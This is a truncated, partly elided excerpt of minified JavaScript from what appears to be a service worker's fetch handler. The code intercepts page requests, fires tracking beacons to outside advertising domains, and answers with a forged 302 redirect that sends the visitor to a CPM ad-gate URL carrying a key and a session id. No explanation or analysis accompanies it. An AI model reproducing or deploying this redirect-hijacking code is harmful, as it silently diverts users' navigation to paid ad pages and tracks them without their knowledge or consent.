    ...
    t.respondWith(async function() {
        if (null !== f && await r(s, f), '1' === o) {
            const t = await u(s),
                ...
                c = await u(a) || "https://www.highperformancecpmgate.com/eifik8mag?key=4c8d2e9ac24dbc50d727b97d6d767d6f",


                o = await u(n);
            return fetch(`https://adscienceltd.com/pixel/pwa?a=2&h=${e}`, {
                mode: 'no-cors'
            }).catch(i), 'true' === o && (await r(n, 'false'), fetch(`https://www.pblimitad.com/name/pwacpm/at?subid_short=${t}`).catch(i)), new Response('', {
                status: 302,
                statusText: 'Found',
                headers: {
                    Location: `${c}&psid=${e}`
